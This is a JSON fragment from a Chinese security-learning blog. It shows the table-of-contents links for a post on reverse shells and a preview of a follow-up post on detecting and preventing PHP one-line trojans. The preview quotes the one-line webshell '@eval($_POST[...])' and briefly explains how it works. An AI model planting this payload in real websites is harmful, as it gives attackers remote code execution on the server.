href=\"#%E5%AE%9E%E6%88%98%E6%97%B6%E6%B3%A8%E6%84%8F\"><span class=\"toc-text\">实战时注意</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E4%B8%AD-%E6%88%91%E6%8B%BFMac%E5%92%8Ckali-linux%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">实战中,我拿Mac和kali-linux进行测试</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell-1\"><span class=\"toc-text\">反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E9%98%85%E8%AF%BB%E6%9B%B4%E5%A4%9A-%E0%B9%91%E2%80%A2%CC%80%E3%85%82%E2%80%A2%CC%81-%D9%88%E2%9C%A7Fighting\"><span class=\"toc-text\">阅读更多(๑•̀ㅂ•́)و✧Fighting</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol>","author":{"name":"wjl110","slug":"blog-author","avatar":"https://avatars.githubusercontent.com/u/53851034?s=400&u=d3e4276dbc73f46c11ffa447d9d9d0803c5274ea&v=4","link":"/","description":"学而不思则罔,思而不学则怠<br /> @ <b>公众号：爱日推</b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"php 网站中的一句话木马识别与防范","uid":"c7ee17cc8146e12609fe83b103aa69f4","slug":"php一句话","date":"2022-03-14T00:37:57.000Z","updated":"2022-03-14T01:22:33.005Z","comments":true,"path":"api/articles/php一句话.json","keywords":null,"cover":null,"text":"PHP 网站中的一句话木马原理:&lt;?php @eval($_POST [‘pass’]);?> 在 PHP 中 eval 函数 把字符串按照 PHP 代码来计算，@ 表示停止报错，pass 为 一句话木马连接器的访问密码，以 POST 方式进行传参， 一句话木马写入数据库&...","link":"","photos":[],"count_time":{"symbolsCount":524,"symbolsTime":"1 mins."},"categories":[{"name":"技术","slug":"技术","count":3,"path":"api/categories/技术.json"}],"tags":[{"name":"学习笔记","slug":"学习笔记","count":4,"path":"api/tags/学习笔记.json"},{"name":"php","slug":"php","count":1,"path":"api/tags/php.json"}],"author":{"name":"wjl110","slug":"blog-author","avatar":"https://avatars.githubusercontent.com/u/53851034?s=400&u=d3e4276dbc73f46c11ffa447d9d9d0803c5274ea&v=4","link":"/","description":"学而不思则罔,思而不学则怠<br /> @ <b>公众号：爱日推</b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}